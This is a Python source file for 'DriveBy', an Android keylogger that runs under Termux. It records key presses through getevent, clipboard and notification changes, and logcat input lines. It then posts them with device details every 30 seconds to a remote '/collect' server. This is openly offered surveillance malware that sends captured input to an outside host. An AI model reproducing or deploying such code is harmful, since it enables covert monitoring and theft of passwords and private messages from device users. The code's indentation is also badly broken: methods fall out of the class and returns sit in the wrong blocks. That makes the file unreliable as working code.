#!/usr/bin/env python3
"""
DriveBy Android Keystroke Monitor
Python script for capturing input events on Android devices (requires Termux)
"""

import os
import sys
import time
import json
import threading
import requests
import socket
from datetime import datetime
import subprocess
import platform

class AndroidKeystrokeMonitor:
    def __init__(self, server_ip="192.168.43.1", server_port=8081):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_url = f"http://{server_ip}:{server_port}/collect"
        self.keystroke_buffer = []
        self.running = True
        self.last_send = time.time()
        self.client_info = self.get_client_info()

    def get_client_info(self):
        """Get Android device information"""
        try:
            info = {
            'hostname': socket.gethostname(),
            'username': os.getenv('USER', 'termux'),
            'os': 'Android',
            'timestamp': datetime.now().isoformat()
            }

            # Try to get Android-specific info
            try:
                # Get Android version
                result = subprocess.run(['getprop', 'ro.build.version.release'],
                capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    info['android_version'] = result.stdout.strip()

                    # Get device model
                    result = subprocess.run(['getprop', 'ro.product.model'],
                    capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        info['device_model'] = result.stdout.strip()

                        # Get device manufacturer
                        result = subprocess.run(['getprop', 'ro.product.manufacturer'],
                        capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            info['manufacturer'] = result.stdout.strip()

            except Exception as e:
                            info['android_info_error'] = str(e)

                            return info

            except Exception as e:
                            print(f"Error getting client info: {e}")
                            return {'error': str(e)}

def check_termux_environment(self):
    """Check if running in Termux environment"""
    return os.path.exists('/data/data/com.termux') or 'termux' in os.getenv('PREFIX', '').lower()

def setup_termux_permissions(self):
    """Setup necessary Termux permissions"""
    print("Setting up Termux permissions...")

    try:
        # Request storage permission
        subprocess.run(['termux-setup-storage'], timeout=10)
        print("Storage permission requested")

        # Install required packages
        packages = ['termux-api', 'python', 'python-pip']
        for package in packages:
            try:
                subprocess.run(['pkg', 'install', '-y', package],
                timeout=60, capture_output=True)
                print(f"Installed {package}")
            except subprocess.TimeoutExpired:
                print(f"Timeout installing {package}")
            except Exception as e:
                print(f"Error installing {package}: {e}")

            except Exception as e:
                print(f"Error setting up permissions: {e}")

def monitor_input_events(self):
    """Monitor Android input events using getevent"""
    try:
        # Try to use getevent to monitor input devices
        print("Attempting to monitor input events...")

        # List available input devices
        result = subprocess.run(['getevent', '-t'],
        capture_output=True, text=True, timeout=2)

        if result.returncode != 0:
            print("getevent not available or no permissions")
            return False

            # Start monitoring in a separate process
            process = subprocess.Popen(['getevent', '-t'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True)

            print("Started input event monitoring...")

            while self.running:
                try:
                    line = process.stdout.readline()
                    if line:
                        self.process_input_event(line.strip())

                        # Send data periodically
                        if time.time() - self.last_send >= 30:
                            self.send_keystroke_data()

                except Exception as e:
                            print(f"Error reading input events: {e}")
                            break

                            process.terminate()
                            return True

                except Exception as e:
                            print(f"Error monitoring input events: {e}")
                            return False

def process_input_event(self, event_line):
    """Process a single input event line"""
    try:
        # Parse getevent output format: [timestamp] device type code value
        if '[' in event_line and ']' in event_line:
            parts = event_line.split('] ', 1)
            if len(parts) == 2:
                timestamp_str = parts[0][1:] # Remove opening bracket
                event_data = parts[1].split()

                if len(event_data) >= 4:
                    device = event_data[0]
                    event_type = event_data[1]
                    code = event_data[2]
                    value = event_data[3]

                    # Filter for key events (type 0001 is EV_KEY)
                    if event_type == '0001' and value == '00000001': # Key press
                    keystroke_info = {
                    'timestamp': datetime.now().isoformat(),
                    'device': device,
                    'event_type': 'key_press',
                    'key_code': code,
                    'raw_event': event_line
                    }
                    self.keystroke_buffer.append(keystroke_info)

    except Exception as e:
                    print(f"Error processing event: {e}")

def monitor_termux_api(self):
    """Monitor using Termux API"""
    print("Using Termux API monitoring...")

    while self.running:
        try:
            # Monitor clipboard changes as a proxy for input activity
            result = subprocess.run(['termux-clipboard-get'],
            capture_output=True, text=True, timeout=5)

            if result.returncode == 0:
                clipboard_content = result.stdout.strip()
                if clipboard_content and clipboard_content != getattr(self, 'last_clipboard', ''):
                    keystroke_info = {
                    'timestamp': datetime.now().isoformat(),
                    'event_type': 'clipboard_change',
                    'content_length': len(clipboard_content),
                    'content_hash': hash(clipboard_content) # Don't store actual content for privacy
                    }
                    self.keystroke_buffer.append(keystroke_info)
                    self.last_clipboard = clipboard_content

                    # Monitor notification access (if available)
                    try:
                        result = subprocess.run(['termux-notification-list'],
                        capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            notifications = result.stdout.strip()
                            if notifications != getattr(self, 'last_notifications', ''):
                                keystroke_info = {
                                'timestamp': datetime.now().isoformat(),
                                'event_type': 'notification_change',
                                'notification_count': len(notifications.split('\n')) if notifications else 0
                                }
                                self.keystroke_buffer.append(keystroke_info)
                                self.last_notifications = notifications
                    except:
                                pass

                                # Send data periodically
                                if time.time() - self.last_send >= 30:
                                    self.send_keystroke_data()

                                    time.sleep(2)

                    except KeyboardInterrupt:
                                    break
                    except Exception as e:
                                    print(f"Error in Termux API monitoring: {e}")
                                    time.sleep(5)

def monitor_logcat(self):
    """Monitor Android logcat for input events"""
    try:
        print("Monitoring logcat for input events...")

        # Start logcat process
        process = subprocess.Popen(['logcat', '-v', 'time', '*:I'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True)

        while self.running:
            try:
                line = process.stdout.readline()
                if line and ('input' in line.lower() or 'key' in line.lower()):
                    keystroke_info = {
                    'timestamp': datetime.now().isoformat(),
                    'event_type': 'logcat_input',
                    'log_line': line.strip()[:200] # Truncate long lines
                    }
                    self.keystroke_buffer.append(keystroke_info)

                    # Send data periodically
                    if time.time() - self.last_send >= 30:
                        self.send_keystroke_data()

            except Exception as e:
                        print(f"Error reading logcat: {e}")
                        break

                        process.terminate()

            except Exception as e:
                        print(f"Error monitoring logcat: {e}")

def send_keystroke_data(self):
    """Send keystroke data to server"""
    if not self.keystroke_buffer:
        return

        try:
            data = {
            'client_info': self.client_info,
            'keystrokes': self.keystroke_buffer.copy(),
            'batch_info': {
            'count': len(self.keystroke_buffer),
            'start_time': self.keystroke_buffer[0]['timestamp'] if self.keystroke_buffer else None,
            'end_time': self.keystroke_buffer[-1]['timestamp'] if self.keystroke_buffer else None
            }
            }

            response = requests.post(
            self.server_url,
            json=data,
            timeout=10,
            headers={'Content-Type': 'application/json'}
            )

            if response.status_code == 200:
                print(f"Sent {len(self.keystroke_buffer)} events to server")
                self.keystroke_buffer.clear()
                self.last_send = time.time()
            else:
                print(f"Server responded with status: {response.status_code}")

        except requests.exceptions.RequestException as e:
                print(f"Error sending data to server: {e}")
        except Exception as e:
                print(f"Unexpected error sending data: {e}")

def start_monitoring(self):
    """Start Android keystroke monitoring"""
    print("DriveBy Android Monitor Starting...")
    print(f"Server: {self.server_url}")
    print(f"Client: {self.client_info.get('hostname', 'unknown')}")
    print(f"Device: {self.client_info.get('manufacturer', '')} {self.client_info.get('device_model', '')}")

    # Check if running in Termux
    if not self.check_termux_environment():
        print("Warning: Not running in Termux environment")
    else:
        print("Termux environment detected")
        self.setup_termux_permissions()

        # Send initial client info
        self.send_keystroke_data()

        # Try different monitoring methods in order of preference
        methods = [
        ("Input Events", self.monitor_input_events),
        ("Termux API", self.monitor_termux_api),
        ("Logcat", self.monitor_logcat)
        ]

        for method_name, method_func in methods:
            try:
                print(f"Trying {method_name} monitoring...")
                if method_func():
                    print(f"{method_name} monitoring started successfully")
                    break
                else:
                    print(f"{method_name} monitoring failed, trying next method...")
            except Exception as e:
                    print(f"Error with {method_name} monitoring: {e}")
                    continue
                else:
                    print("All monitoring methods failed")

def stop_monitoring(self):
    """Stop monitoring and send remaining data"""
    print("Stopping Android monitor...")
    self.running = False

    # Send any remaining data
    if self.keystroke_buffer:
        self.send_keystroke_data()

        print("Android monitor stopped.")

def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description='DriveBy Android Keystroke Monitor')
    parser.add_argument('--server', default='192.168.43.1', help='Server IP address')
    parser.add_argument('--port', type=int, default=8081, help='Server port')
    parser.add_argument('--setup', action='store_true', help='Setup Termux environment and exit')

    args = parser.parse_args()

    monitor = AndroidKeystrokeMonitor(args.server, args.port)

    if args.setup:
        monitor.setup_termux_permissions()
        return

        try:
            monitor.start_monitoring()
        except KeyboardInterrupt:
            print("\nReceived interrupt signal...")
        finally:
            monitor.stop_monitoring()

            if __name__ == "__main__":
                main()
